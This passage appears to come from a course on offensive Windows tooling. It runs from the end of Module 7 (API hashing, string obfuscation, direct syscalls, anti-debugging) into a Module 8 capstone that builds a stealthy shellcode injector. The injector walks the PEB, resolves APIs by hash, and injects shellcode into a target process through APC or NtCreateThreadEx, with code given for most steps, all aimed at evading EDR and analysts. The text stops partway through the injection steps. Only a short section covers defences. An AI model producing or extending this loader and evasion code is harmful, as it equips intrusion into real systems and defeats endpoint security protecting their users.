LoadLibrary or your hash function)\r\n\r\n    return 0;\r\n}\r\n```\r\n\r\n*(**Note:** In actual malware development, you wouldn't typically use `std::vector` or `std::string` in your low-level loader code, as these introduce dependencies. You would define the encoded bytes directly in a byte array `char encoded_dll[] = { 0xXX, 0xYY, ... };` and use a raw pointer and loop for decoding. The example above uses vector/string for simpler demonstration.)*\r\n\r\n#### **Applying String Obfuscation**\r\n\r\nYou would apply this to:\r\n\r\n1.  **DLL Names:** Obfuscate \"kernel32.dll\", \"ntdll.dll\", etc. Decode them just before calling `LoadLibraryA`/`LdrGetDllHandle` or before passing them to your custom module base finding logic (if you're not using `GetModuleHandle`).\r\n2.  **API Hashes (if needed):** If you store hashes as strings (e.g., \"0x1234ABCD\"), obfuscate those too. More commonly, hashes are stored directly as `DWORD` values, which don't need string obfuscation, but the *code* that calculates or uses them might still contain patterns.\r\n3.  **Other Sensitive Strings:** C2 URLs, file paths, registry keys, mutex names, etc.\r\n\r\nBy combining API hashing and string obfuscation, you make it significantly harder for static analysis to determine which APIs are being called or what resources the malware interacts with. This forces analysts to rely more on dynamic analysis (running the code in a debugger or sandbox), which introduces its own challenges (like anti-analysis checks, which we'll touch on later).\r\n\r\n**Project Task Connection:** Your Module 7 project will implement a simple string obfuscation routine (like XOR) and use it to hide at least the names \"kernel32.dll\" and \"ntdll.dll\" within your code. You'll decode them at runtime before using them with your (now hash-based) dynamic resolver.\r\n\r\n### **7.4 Introduction to Direct System Calls (Syscalls)**\r\n\r\nThis is an advanced topic, but it's essential to understand the concept as it's a prevalent evasion technique in modern malware.\r\n\r\n**The Problem:** Even if you use dynamic API resolution and obfuscate strings, you are still eventually calling functions within user-mode DLLs like `ntdll.dll` (e.g., `NtAllocateVirtualMemory`, `NtCreateThreadEx`). Security products, especially Endpoint Detection and Response (EDR) systems, heavily rely on hooking functions in user-mode DLLs like `ntdll.dll` and `kernel32.dll` to monitor process behavior. When your code calls `NtAllocateVirtualMemory`, the EDR's hook gets executed, logs the call, inspects the arguments, and potentially blocks it.\r\n\r\n**The Solution: Bypassing User-Mode Hooks via Direct Syscalls.**\r\n\r\nInstead of calling the `NtAllocateVirtualMemory` function exported by `ntdll.dll` (which is a user-mode wrapper around the actual kernel operation), you can bypass this wrapper and execute the low-level instruction (`syscall` on x64, `sysenter` on x86) that transitions from user-mode to kernel-mode to request the operation directly.\r\n\r\nEvery Native API function (`Nt...` or `Zw...`) in `ntdll.dll` has a corresponding syscall number. The function stub in `ntdll.dll` typically just loads the syscall number into a specific register (like `EAX` on x86 or `RAX` on x64) and then executes the syscall instruction.\r\n\r\nBy implementing your own syscall stub (often in assembly or using compiler intrinsics), you can load the correct syscall number and execute the `syscall` instruction yourself, completely bypassing the `ntdll.dll` function's entry point where the EDR's hook might be placed.\r\n\r\n```assembly\r\n; Example x64 Syscall Stub (Conceptual)\r\n; For NtAllocateVirtualMemory (Syscall number varies by OS version!)\r\n; rcx = ProcessHandle\r\n; rdx = BaseAddress\r\n; r8  = ZeroBits\r\n; r9  = RegionSize\r\n; [rsp+0x20] = AllocationType\r\n; [rsp+0x28] = Protect\r\n\r\nmov rax, <syscall_number_for_NtAllocateVirtualMemory> ; Load syscall number into RAX\r\nsyscall                                               ; Execute syscall instruction\r\nret                                                   ; Return to caller\r\n```\r\n\r\n*(**Note:** This is highly simplified. Parameter passing conventions vary, and finding the correct syscall number dynamically is a complex task often involving parsing `ntdll.dll` at runtime, looking for specific instruction patterns (the syscall stubs), and extracting the number. Syscall numbers change between Windows versions and even builds, making hardcoding them unreliable.)*\r\n\r\n#### **Challenges of Direct Syscalls:**\r\n\r\n*   **OS Version/Build Dependency:** Syscall numbers are not fixed. Code that works on Windows 10 20H2 might break on Windows 11 22H2. Advanced techniques involve dynamically finding syscall numbers at runtime.\r\n*   **Implementation Complexity:** Requires writing assembly or using compiler intrinsics, understanding calling conventions at the syscall boundary.\r\n*   **Detection:** While you bypass user-mode hooks, the transition to kernel-mode *can* still be monitored by kernel-mode security components or hypervisor-based security. Anomalies in syscall parameters or sequences can also be detected. Security products are also getting better at detecting user-mode code that *looks* like syscall stubs.\r\n*   **Stability:** Incorrectly preparing parameters or using the wrong syscall number can crash the process or the system.\r\n\r\n**Why we're only introducing it:** Implementing robust, version-agnostic direct syscalls is a significant undertaking that requires deep assembly knowledge and runtime `ntdll.dll` analysis. It often warrants its own dedicated module or course. However, understanding *why* attackers use it (bypassing user-mode hooks) is crucial for understanding modern evasion and defense.\r\n\r\n### **7.5 Position-Independent Code (PIC)**\r\n\r\nThis concept is fundamental for shellcode and injected payloads, although it's not strictly an *evasion* technique itself, it's an *enabling* technique for stealthy execution in arbitrary memory locations.\r\n\r\n**What is PIC?** Position-Independent Code is executable code that can run correctly regardless of the memory address where it is loaded. It doesn't rely on hardcoded absolute memory addresses for jumps, calls, or data access.\r\n\r\n**Why is it Important for Injected Code?** When you allocate memory in a target process (e.g., using `VirtualAllocEx` or `NtAllocateVirtualMemory`), you don't know *exactly* where that memory block will be. It depends on the target process's existing memory layout. If your injected code (your shellcode) contains instructions like `call 0x12345678` or accesses data at `mov eax, [0xABCDEF00]`, these absolute addresses will be wrong because your code isn't loaded at its \"intended\" base address.\r\n\r\nPIC solves this by using relative addressing. Instead of `call 0x12345678`, it uses `call relative_offset_to_target`. The CPU calculates the actual target address relative to the current instruction pointer (`RIP` on x64). Data access uses similar RIP-relative addressing (`mov eax, [rip + relative_offset_to_data]`).\r\n\r\n**How is PIC Achieved?**\r\n\r\n*   **Compilers:** Compilers can generate PIC for shared libraries (`.dll`s) using flags like `-fPIC` (GCC/Clang) or `/DYNAMICBASE` and `/FIXED:NO` (MSVC linker options, though true PIC for `.exe`-like code is harder).\r\n*   **Assembly:** Writing shellcode directly in assembly allows precise control over addressing modes (using `CALL/POP` tricks on x86 or RIP-relative addressing on x64).\r\n*   **Manual Relocation:** For more complex injected modules (like injecting a full DLL manually), you might implement a mini-loader that performs runtime relocation, fixing up absolute addresses based on the actual load address.\r\n\r\nYour shellcode payload itself (the bytes you allocate and write into the target process) *must* be PIC. This is why simple C/C++ functions compiled normally are often not suitable directly as shellcode; they contain absolute references that will break. You need to compile them specifically for PIC or write them in assembly.\r\n\r\n### **7.6 Simple Code Obfuscation and Anti-Analysis Tricks**\r\n\r\nBeyond hiding API calls and strings, attackers use various techniques to make the code itself harder to reverse engineer and analyze dynamically.\r\n\r\n*   **Junk Code:** Inserting instructions that do nothing functionally but alter the code's appearance, confusing disassemblers and analysts.\r\n*   **Control Flow Obfuscation:** Replacing simple `if/else` or loops with convoluted sequences of jumps, indirect calls, or state-machine-like logic.\r\n*   **Stack Strings:** Constructing strings on the stack byte by byte at runtime instead of having them in the data section.\r\n*   **Encoding/Encryption:** Encrypting the main payload and only decrypting it in memory just before execution. The decryption key might be derived at runtime based on environmental factors.\r\n*   **Simple Anti-Debugging Checks:**\r\n    *   `IsDebuggerPresent()`: A simple WinAPI call. Easily bypassed but catches the laziest attempts.\r\n    *   Checking the PEB (`Process Environment Block`): The `BeingDebugged` flag is stored here. Accessing the PEB requires understanding OS structures (tying back to Module 1 and `zhasslan.txt` concepts).\r\n    *   Timing Checks: Measuring the time between two points. If it takes too long (due to debugger breakpoints or single-stepping), the code might detect analysis.\r\n    *   Looking for debugger windows or processes.\r\n\r\nThese techniques add layers of complexity. An analyst hitting obfuscated code or an anti-debugging check has to spend time understanding and bypassing it, slowing down the analysis process.\r\n\r\n### **7.7 Case Study Snippet: Emotet/TrickBot Evasion**\r\n\r\nMalware families like Emotet and TrickBot (and their loaders) are notorious for their sophisticated evasion techniques. They frequently employ:\r\n\r\n1.  **Heavy API Hashing:** Almost all Windows API calls are resolved via hashing, making static analysis of their imports useless.\r\n2.  **Extensive String Obfuscation:** Configuration data, C2 URLs, injected DLL names, mutex names ‚Äì all are heavily obfuscated, often with multi-layered schemes (XOR, RC4, custom algorithms).\r\n3.  **Dynamic Syscall Resolution:** Newer variants often incorporate techniques to find and use syscalls directly to evade EDR hooks.\r\n4.  **Packed/Encoded Payloads:** The core malicious payload is often encrypted or encoded, only being decrypted in memory by a small, highly obfuscated loader stub.\r\n5.  **Anti-Analysis Checks:** They often include checks for debuggers, sandboxes, and analysis tools.\r\n\r\nThese families demonstrate the practical application of the techniques we're discussing. Their loaders are prime examples of the principles from `zhasslan.txt` ‚Äì minimizing the static footprint, obscuring control flow, and dynamically resolving everything possible. Analyzing samples from these families (in a safe, isolated environment!) is an excellent way to see these techniques in action.\r\n\r\n### **7.8 Defensive Considerations (Briefly)**\r\n\r\nHow do defenders counter these techniques?\r\n\r\n*   **Emulation/Execution:** Security products run the initial code in a safe environment (emulator, sandbox) to trigger the decoding and hashing routines and reveal the actual API calls and strings.\r\n*   **Behavioral Analysis:** Even if API calls are obfuscated, the *behavior* (allocating executable memory, writing code, creating remote threads/APCs) is often detectable.\r\n*   **Memory Scanning:** Scanning process memory for known shellcode patterns or decoded strings after the payload has been unpacked/decoded.\r\n*   **Hooking Deeper:** Attempting to hook syscalls in the kernel (more difficult and risky) or monitoring the syscall instruction itself.\r\n*   **Heuristics:** Detecting code patterns common in obfuscated code or custom syscall stubs.\r\n*   **Threat Intelligence:** Sharing hashes of obfuscation routines or specific code patterns observed in the wild.\r\n\r\nIt's a constant arms race! Attackers develop new evasion, defenders develop new detection, and so on. Understanding both sides is key.\r\n\r\n### **7.9 Module Project/Exercise: Enhancing Your Resolver with Hashing and Obfuscation**\r\n\r\nAlright, let's put this into practice. Your task is to take the dynamic API resolver you built in Module 6 and make it stealthier.\r\n\r\n**Goal:** Modify your custom `GetProcAddress`-like function to use API hashing instead of string comparison, and implement string obfuscation for the DLL names.\r\n\r\n**Steps:**\r\n\r\n1.  **Review Module 6 Code:** Get your working code that manually parses the PE Export Directory to find a function address by name.\r\n2.  **Implement a Hashing Algorithm:** Choose either the ROR13 example provided or another simple, fast hash function. Implement this as a C++ function, e.g., `DWORD CalculateAPIHash(const char* apiName)`.\r\n3.  **Modify Your Resolver Function:**\r\n    *   Change the function signature of your custom `GetProcAddress` to accept a `DWORD` hash value instead of a `const char*` function name. Let's call it `LPVOID GetProcAddressByHash("
    },
    {
      "title": "module_8",
      "description": "module_8 Overview",
      "order": 8,
      "content": "Alright team, welcome to the culmination of our journey! Module 8 is where we take all the powerful, low-level knowledge we've acquired over the past seven modules ‚Äì understanding Windows internals, mastering different execution contexts (APCs, Native Threads, Fibers), dissecting the PE format, and building dynamic API resolution with evasion ‚Äì and synthesize it into a single, functional, stealthy tool.\r\n\r\nThis isn't just an exercise; it's about building a core capability. The concepts here form the backbone of many advanced offensive tools and sophisticated malware loaders. We're moving from understanding individual components to constructing a system.\r\n\r\nLet's get building!\r\n\r\n---\r\n\r\n## **Module 8: Capstone Project - Building Your Advanced Execution Framework**\r\n\r\n**Module Objective:** Integrate the advanced techniques learned throughout the course into a single, functional tool capable of executing arbitrary shellcode in a target process using multiple stealthy and resilient methods, demonstrating mastery of the course material.\r\n\r\n**Time Allotment:** This module will likely take the most time, potentially spanning several sessions or a significant portion of your dedicated lab time. It's a building phase.\r\n\r\n---\r\n\r\n### **8.1 Introduction: Synthesizing Knowledge into Capability**\r\n\r\nWe've spent the last seven modules digging into the nitty-gritty:\r\n*   Module 1: Process/Thread/Memory deep dive.\r\n*   Module 2: APC Injection mechanics (`NtQueueApcThread`).\r\n*   Module 3: Native API power (`NtCreateThreadEx`, `NtAllocateVirtualMemory`).\r\n*   Module 4: Fibers and Context Manipulation (`SwitchToFiber`, `SetThreadContext`).\r\n*   Module 5: Unconventional paths (Window Messages, Callbacks).\r\n*   Module 6: Dynamic API Resolution (PE Parsing, EAT traversal).\r\n*   Module 7: Advanced Evasion (API Hashing, String Obfuscation).\r\n\r\nNow, it's time to combine these. Our goal is to create a tool that can:\r\n\r\n1.  Take a target Process ID (PID) and a raw shellcode file as input.\r\n2.  Allow the user to select an injection method (at least two from APC, Native Thread (`NtCreateThreadEx`), or potentially Fiber/Context manipulation if you got the stretch goals working).\r\n3.  Read the shellcode from the file.\r\n4.  Perform the injection into the target process.\r\n5.  **CRITICALLY:** Perform *all* necessary Windows/Native API calls (`OpenProcess`, memory allocation, writing, thread/APC creation, handle closing, etc.) using the **dynamic API resolution framework** you built in Modules 6 & 7 (including hashing/obfuscation where applicable). No static imports beyond the absolute minimum startup code (like reading command line args, though even that could be avoided with more advanced techniques we won't cover here).\r\n6.  Be reasonably robust and include basic error handling.\r\n\r\nThink of this as building your own mini-Metasploit `inject` payload handler, but with a focus on the stealthy, low-level mechanics we've explored.\r\n\r\n### **8.2 Recap of Core Requirements for the Capstone Tool**\r\n\r\nLet's be crystal clear about what your final tool needs to demonstrate:\r\n\r\n*   **Input:** Target PID (integer), Shellcode file path (string), Injection method choice (e.g., command-line flag `--method apc` or `--method native`).\r\n*   **Core Functionality:** Read shellcode, inject into target process, execute shellcode.\r\n*   **Injection Methods:** Implement *at least two* distinct methods covered in the course (e.g., APC via `NtQueueApcThread`, Native Thread via `NtCreateThreadEx`).\r\n*   **API Resolution:** **All** Windows API and Native API functions required for the injection process *must* be resolved dynamically at runtime.\r\n    *   This includes: `OpenProcess`, memory allocation (`VirtualAllocEx` or `NtAllocateVirtualMemory`), memory writing (`WriteProcessMemory` or `NtWriteVirtualMemory`), thread/APC creation (`CreateRemoteThreadEx` or `NtCreateThreadEx` or `QueueUserAPC` or `NtQueueApcThread`), handle closing (`CloseHandle` or `NtClose`), error checking functions (`GetLastError` or `NtStatus` checks).\r\n    *   This dynamic resolution must leverage your PE parsing and EAT traversal logic from Module 6.\r\n    *   Ideally, this resolution should use the API hashing logic from Module 7 to avoid cleartext function names.\r\n    *   *Advanced Challenge:* Even `LoadLibraryA`/`GetProcAddress` (or their Native equivalents) should be resolved dynamically, typically by manually parsing the Process Environment Block (PEB) to find the base addresses of `kernel32.dll` and `ntdll.dll`. This avoids *any* static import beyond the very initial program entry point. (We'll provide guidance on the PEB approach).\r\n*   **Evasion:** Integrate API hashing and potentially string obfuscation (Module 7) for DLL/function names used in the dynamic resolution process itself.\r\n*   **Environment:** Build and test in your isolated lab environment (VM!).\r\n\r\n### **8.3 Architectural Design and Planning**\r\n\r\nBefore we write code, let's plan the structure. A simple command-line tool structure works well:\r\n\r\n```\r\n[main function]\r\n    -> Parse command line arguments (PID, shellcode file, method)\r\n    -> Read shellcode from file\r\n    -> [Setup Dynamic API Resolver]\r\n        -> Initialize resolver (e.g., parse PEB to find kernel32/ntdll base addresses)\r\n        -> Resolve ALL necessary API function pointers using hashes/names\r\n        -> Store resolved pointers (e.g., in a struct or global variables)\r\n    -> [Open Target Process]\r\n        -> Use resolved `OpenProcess` (or `NtOpenProcess`)\r\n        -> Handle errors (e.g., permissions)\r\n    -> [Select and Execute Injection Method]\r\n        -> Based on user input (method flag):\r\n            -> Call `ExecuteInjectionAPC(...)` function\r\n            -> Call `ExecuteInjectionNativeThread(...)` function\r\n            // -> Call `ExecuteInjectionFiber(...)` etc.\r\n    -> [Cleanup]\r\n        -> Use resolved `CloseHandle` (or `NtClose`) for process handle\r\n    -> Report success/failure\r\n```\r\n\r\n**Key Design Considerations:**\r\n\r\n1.  **Dynamic Resolver Implementation:** How will you make your Module 6/7 code easily callable?\r\n    *   Option A: A class `DynamicResolver` with a method like `GetProcAddressByHash(moduleHash, functionHash)`.\r\n    *   Option B: A set of global function pointers that are populated by an `InitializeResolver()` function at the start of `main`. This is often simpler for small tools.\r\n    *   *PEB Parsing:* To avoid even `GetModuleHandleA`/`LoadLibraryA` as static imports or initial dynamic calls, you'll need to find module base addresses by walking the PEB. This is a common technique in shellcode and advanced loaders because the PEB's address is easily accessible (`FS` segment register on x86, `GS` on x64). We'll outline this.\r\n\r\n2.  **Storing Resolved Pointers:** A `struct` is a clean way to hold all your resolved API function pointers:\r\n\r\n    ```c++\r\n    // Example struct to hold resolved function pointers\r\n    typedef struct _RESOLVED_APIS {\r\n        // kernel32.dll / WinAPI functions\r\n        FARPROC pOpenProcess;\r\n        FARPROC pVirtualAllocEx;\r\n        FARPROC pWriteProcessMemory;\r\n        FARPROC pCloseHandle;\r\n        FARPROC pGetLastError; // Or NtStatus checks if using Native\r\n\r\n        // ntdll.dll / Native API functions\r\n        FARPROC pNtOpenProcess; // Alternative to OpenProcess\r\n        FARPROC pNtAllocateVirtualMemory; // Alternative to VirtualAllocEx\r\n        FARPROC pNtWriteVirtualMemory; // Alternative to WriteProcessMemory\r\n        FARPROC pNtCreateThreadEx; // Alternative to CreateRemoteThreadEx\r\n        FARPROC pNtQueueApcThread; // For APC injection\r\n        FARPROC pNtClose; // Alternative to CloseHandle\r\n        FARPROC pNtGetNextThread; // For finding threads for APCs (less common, often iterate Snapshots instead)\r\n        // ... add others as needed\r\n    } RESOLVED_APIS, *PRESOLVED_APIS;\r\n\r\n    RESOLVED_APIS g_ResolvedAPIs; // Global instance\r\n    ```\r\n\r\n3.  **Error Handling:** Since you're using low-level APIs and working across process boundaries, errors are frequent. Check return values of *every* API call. Use `GetLastError()` (resolved dynamically, of course!) or check `NTSTATUS` values and print informative messages.\r\n\r\n4.  **Shellcode Format:** Keep it simple: a raw binary file containing the shellcode bytes. Read it into a `char*` or `BYTE*` buffer.\r\n\r\n### **8.4 Step-by-Step Implementation Guide**\r\n\r\nLet's break down the coding process.\r\n\r\n**Step 1: Project Setup and Boilerplate**\r\n\r\n*   Create a new C++ console project in your IDE (Visual Studio, or use GCC/Clang with MinGW/Cygwin).\r\n*   Include necessary headers. Since we're avoiding static imports, you might only need `<windows.h>` (for basic types like `HANDLE`, `DWORD`, `LPVOID`), `<iostream>` (for console output), `<vector>` (for shellcode buffer), `<fstream>` (for reading shellcode), `<string>`, `<tchar.h>` (if dealing with TCHARs, though byte strings are often simpler for low-level work), `<winternl.h>` (for `NTSTATUS`, `PPEB`, etc. - these structures/enums are often needed even if the functions are resolved dynamically).\r\n*   Add your hashing function code (Module 7).\r\n*   Add your PE parsing/EAT traversal code (Module 6).\r\n*   Define the `RESOLVED_APIS` struct.\r\n\r\n**Step 2: Implementing PEB Parsing for Initial Module Base Addresses**\r\n\r\nTo achieve full dynamic resolution without relying on `GetModuleHandleA` or `LoadLibraryA` initially, we'll find the base addresses of `kernel32.dll` and `ntdll.dll` by walking the Process Environment Block (PEB). This requires a bit of low-level pointer magic and understanding the PEB structure.\r\n\r\n*   The PEB is pointed to by the `FS` register on x86 and `GS` on x64.\r\n*   The PEB contains a pointer to the `PEB_LDR_DATA` structure, which in turn contains linked lists of loaded modules.\r\n*   We can iterate these lists to find the modules we need (`ntdll.dll` and `kernel32.dll`) by comparing their names.\r\n\r\n*   **Code Snippet (Conceptual - x64):**\r\n\r\n    ```c++\r\n    #include <windows.h>\r\n    #include <winternl.h> // For PEB structures\r\n    #include <string>\r\n    #include <vector>\r\n\r\n    // Define necessary types if winternl.h isn't sufficient or for clarity\r\n    // For x64:\r\n    typedef struct _PEB_LDR_DATA_X64 {\r\n        DWORD       Reserved1[2];\r\n        PVOID       Reserved2[3];\r\n        LIST_ENTRY  InMemoryOrderModuleList;\r\n        // ... rest of structure\r\n    } PEB_LDR_DATA_X64, *PPEB_LDR_DATA_X64;\r\n\r\n    typedef struct _LDR_DATA_TABLE_ENTRY_X64 {\r\n        LIST_ENTRY InLoadOrderLinks;\r\n        LIST_ENTRY InMemoryOrderLinks;\r\n        LIST_ENTRY InInitializationOrderLinks;\r\n        PVOID DllBase; // THIS is the base address we need!\r\n        PVOID EntryPoint;\r\n        ULONG SizeOfImage;\r\n        UNICODE_STRING FullDllName;\r\n        UNICODE_STRING BaseDllName; // THIS is the name we compare!\r\n        ULONG Flags;\r\n        USHORT LoadCount;\r\n        USHORT TlsIndex;\r\n        LIST_ENTRY HashLinks;\r\n        PVOID SectionPointer;\r\n        ULONG CheckSum;\r\n        ULONG TimeDateStamp;\r\n        PVOID LoadedImports;\r\n        PVOID EntryPointActivationContext;\r\n        PVOID PatchInformation;\r\n        LIST_ENTRY ForwarderLinks;\r\n        LIST_ENTRY ServiceTagLinks;\r\n        LIST_ENTRY StaticImportLinks;\r\n    } LDR_DATA_TABLE_ENTRY_X64, *PLDR_DATA_TABLE_ENTRY_X64;\r\n\r\n    // Function to get module base address via PEB parsing\r\n    // Requires Module 6/7 PE parsing logic\r\n    // Needs to handle UNICODE_STRING comparison\r\n    HMODULE GetModuleBaseFromPEB(const std::wstring& moduleName) {\r\n        // Get PEB address (x64 specific - uses GS register)\r\n        PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is the offset for PEB on x64\r\n\r\n        // Get LDR_DATA_TABLE_ENTRY list\r\n        PPEB_LDR_DATA pLdr = pPeb->Ldr; // For x64, use the direct field\r\n\r\n        // Walk the InLoadOrderModuleList (or InMemoryOrderModuleList)\r\n        // Note: The structure offsets and list names can vary slightly by OS version/architecture\r\n        // InMemoryOrderModuleList is often preferred as it's consistent\r\n        PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;\r\n        PLIST_ENTRY pListEntry = pListHead->Flink;\r\n\r\n        // The first entry is the executable, the second is ntdll, third is kernel32 usually,\r\n        // but iterating and comparing names is safer.\r\n        while (pListEntry != pListHead) {\r\n            // Calculate address of the LDR_DATA_TABLE_ENTRY from the LIST_ENTRY\r\n            // This offset is specific to the structure definition\r\n            // For x64, InMemoryOrderLinks is usually at offset 0x10 within LDR_DATA_TABLE_ENTRY_X64\r\n            PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));\r\n\r\n            // Compare BaseDllName (UNICODE_STRING) with the target module name\r\n            // Need a helper to convert UNICODE_STRING to wstring/string for comparison\r\n            std::wstring currentModuleName(pEntry->BaseDllName.Buffer, pEntry->BaseDllName.Length / sizeof(WCHAR));\r\n\r\n            if (_wcsicmp(currentModuleName.c_str(), moduleName.c_str()) == 0) {\r\n                return (HMODULE)pEntry->DllBase; // Found it!\r\n            }\r\n\r\n            pListEntry = pListEntry->Flink; // Move to the next entry\r\n        }\r\n\r\n        return nullptr; // Not found\r\n    }\r\n\r\n    // Need a function to convert UNICODE_STRING to std::wstring for comparison\r\n    // (Implementation omitted for brevity, but involves WideCharToMultiByte or similar)\r\n    // Need to handle x86 PEB parsing (__readfsdword(0x30) for PEB pointer)\r\n    ```\r\n*   **Important:** PEB structure offsets and the list names/order can vary between Windows versions and architectures (x86 vs x64). The code above is a conceptual x64 example. You'll need to adapt it or find architecture-specific definitions. This is where relying on resources like `winternl.h` and careful debugging/analysis comes in.\r\n\r\n**Step 3: Implementing the Full Dynamic Resolver Initialization**\r\n\r\nCombine the PEB parsing with your EAT traversal from Module 6/7.\r\n\r\n*   Create a function, e.g., `InitializeResolvedAPIs(PRESOLVED_APIS pApiStruct)`.\r\n*   Inside this function:\r\n    *   Call `GetModuleBaseFromPEB` to get the base address of `ntdll.dll`.\r\n    *   Call `GetModuleBaseFromPEB` to get the base address of `kernel32.dll`.\r\n    *   For each required API function listed in your `RESOLVED_APIS` struct:\r\n        *   Get the module base address (`ntdll_base` or `kernel32_base`).\r\n        *   Calculate the hash of the function name string (using your Module 7 hash function).\r\n        *   Call your Module 6/7 EAT parsing function (adapted to take base address and hash) to get the function pointer.\r\n        *   Store the resulting pointer in the `pApiStruct`.\r\n        *   Include robust error checking: If any required function fails to resolve, the initialization should fail, and the program should exit gracefully.\r\n\r\n*   **Code Snippet (Conceptual):**\r\n\r\n    ```c++\r\n    #include \"YourDynamicResolverCode.h\" // Include your Module 6/7 code\r\n    #include \"YourHashingCode.h\"        // Include your Module 7 code\r\n\r\n    // Global struct instance\r\n    RESOLVED_APIS g_ResolvedAPIs = { 0 }; // Initialize to null\r\n\r\n    BOOL InitializeResolvedAPIs() {\r\n        // Step 1: Get module bases via PEB\r\n        HMODULE hNtdll = GetModuleBaseFromPEB(L\"ntdll.dll\"); // Need wstring comparison helper\r\n        HMODULE hKernel32 = GetModuleBaseFromPEB(L\"kernel32.dll\");\r\n\r\n        if (!hNtdll || !hKernel32) {\r\n            // Handle error: Could not find essential modules\r\n            std::cerr << \"[-] Failed to find essential modules via PEB.\\n\";\r\n            return FALSE;\r\n        }\r\n\r\n        // Step 2: Resolve necessary APIs using EAT traversal (from Module 6/7)\r\n        // Adapt your GetProcAddressByHash function to take HMODULE and hash\r\n        // Example: FARPROC GetProcAddressByHash(HMODULE hModule, DWORD functionHash);\r\n\r\n        // Resolve kernel32.dll APIs\r\n        g_ResolvedAPIs.pOpenProcess = GetProcAddressByHash(hKernel32, HashString(\"OpenProcess\")); // Need your hashing function\r\n        g_ResolvedAPIs.pVirtualAllocEx = GetProcAddressByHash(hKernel32, HashString(\"VirtualAllocEx\"));\r\n        g_ResolvedAPIs.pWriteProcessMemory = GetProcAddressByHash(hKernel32, HashString(\"WriteProcessMemory\"));\r\n        g_ResolvedAPIs.pCloseHandle = GetProcAddressByHash(hKernel32, HashString(\"CloseHandle\"));\r\n        g_ResolvedAPIs.pGetLastError = GetProcAddressByHash(hKernel32, HashString(\"GetLastError\"));\r\n\r\n        // Resolve ntdll.dll APIs\r\n        g_ResolvedAPIs.pNtOpenProcess = GetProcAddressByHash(hNtdll, HashString(\"NtOpenProcess\"));\r\n        g_ResolvedAPIs.pNtAllocateVirtualMemory = GetProcAddressByHash(hNtdll, HashString(\"NtAllocateVirtualMemory\"));\r\n        g_ResolvedAPIs.pNtWriteVirtualMemory = GetProcAddressByHash(hNtdll, HashString(\"NtWriteVirtualMemory\"));\r\n        g_ResolvedAPIs.pNtCreateThreadEx = GetProcAddressByHash(hNtdll, HashString(\"NtCreateThreadEx\"));\r\n        g_ResolvedAPIs.pNtQueueApcThread = GetProcAddressByHash(hNtdll, HashString(\"NtQueueApcThread\"));\r\n        g_ResolvedAPIs.pNtClose = GetProcAddressByHash(hNtdll, HashString(\"NtClose\"));\r\n        // Resolve other ntdll functions if needed for specific techniques (e.g., NtGetNextThread for APC target)\r\n\r\n        // Step 3: Check if ALL required APIs were resolved\r\n        // This is crucial! Add checks for every pointer you need.\r\n        if (!g_ResolvedAPIs.pOpenProcess || !g_ResolvedAPIs.pVirtualAllocEx || /* ... other checks ... */) {\r\n             std::cerr << \"[-] Failed to resolve one or more required APIs.\\n\";\r\n             // You might print which ones failed based on individual checks\r\n             return FALSE;\r\n        }\r\n\r\n        std::cout << \"[+] Successfully resolved all required APIs.\\n\";\r\n        return TRUE;\r\n    }\r\n\r\n    // Helper function to call GetLastError using the resolved pointer\r\n    DWORD GetLastErrorResolved() {\r\n        if (g_ResolvedAPIs.pGetLastError) {\r\n            // Cast the FARPROC to the function pointer type and call it\r\n            typedef DWORD (WINAPI* GetLastErrorFn)();\r\n            GetLastErrorFn pfnGetLastError = (GetLastErrorFn)g_ResolvedAPIs.pGetLastError;\r\n            return pfnGetLastError();\r\n        }\r\n        return 0; // Default or error value if resolver failed\r\n    }\r\n\r\n    // Example macro for calling resolved APIs safely\r\n    #define CALL_RESOLVED_API(api_ptr, ...) \\\r\n        (((decltype(&api_ptr))api_ptr)(__VA_ARGS__))\r\n\r\n    // Example usage:\r\n    // HANDLE hProc = CALL_RESOLVED_API(g_ResolvedAPIs.pOpenProcess, ...);\r\n    // DWORD err = GetLastErrorResolved();\r\n    // NTSTATUS status = CALL_RESOLVED_API(g_ResolvedAPIs.pNtAllocateVirtualMemory, ...);\r\n    ```\r\n*   **String Obfuscation (Module 7):** Instead of using literal strings `\"OpenProcess\"`, `\"ntdll.dll\"`, etc., calculate their hashes *at compile time* (if your hashing function allows `constexpr`) or obfuscate the strings and deobfuscate them *at runtime* just before calculating the hash for the EAT lookup. This makes static analysis harder.\r\n\r\n**Step 4: Reading Shellcode from File**\r\n\r\nStandard file I/O. Read the entire content of the shellcode file into a `std::vector<BYTE>` or `BYTE*` buffer.\r\n\r\n*   **Code Snippet:**\r\n\r\n    ```c++\r\n    #include <fstream>\r\n    #include <vector>\r\n\r\n    // Function to read shellcode from a file\r\n    std::vector<BYTE> ReadShellcodeFile(const std::string& filePath) {\r\n        std::ifstream file(filePath, std::ios::binary | std::ios::ate);\r\n        if (!file.is_open()) {\r\n            std::cerr << \"[-] Failed to open shellcode file: \" << filePath << \"\\n\";\r\n            return {}; // Return empty vector on failure\r\n        }\r\n\r\n        std::streamsize fileSize = file.tellg();\r\n        file.seekg(0, std::ios::beg);\r\n\r\n        std::vector<BYTE> buffer(fileSize);\r\n        if (!file.read(reinterpret_cast<char*>(buffer.data()), fileSize)) {\r\n            std::cerr << \"[-] Failed to read shellcode file: \" << filePath << \"\\n\";\r\n            return {};\r\n        }\r\n\r\n        std::cout << \"[+] Read \" << fileSize << \" bytes of shellcode from \" << filePath << \"\\n\";\r\n        return buffer;\r\n    }\r\n    ```\r\n\r\n**Step 5: Implementing Injection Method 1 (e.g., APC)**\r\n\r\nThis function will encapsulate the APC injection logic from Module 2, but using the dynamically resolved APIs stored in `g_ResolvedAPIs`.\r\n\r\n*   **Function Signature:** `BOOL ExecuteInjectionAPC(DWORD targetPid, const std::vector<BYTE>& shellcode)`\r\n*   **Steps (using resolved APIs):**\r\n    1.  Get a handle to the target process: `HANDLE hProcess = CALL_RESOLVED_API(g_ResolvedAPIs.pOpenProcess, PROCESS_ALL_ACCESS, FALSE, targetPid);` (Or use `pNtOpenProcess`). Check handle validity.\r\n    2.  Allocate memory in the target process: `LPVOID remoteBuffer = CALL_RESOLVED_API(g_ResolvedAPIs.pVirtualAllocEx, hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);` (Or use `pNtAllocateVirtualMemory`). Check allocated address.\r\n    3.  Write shellcode to the allocated 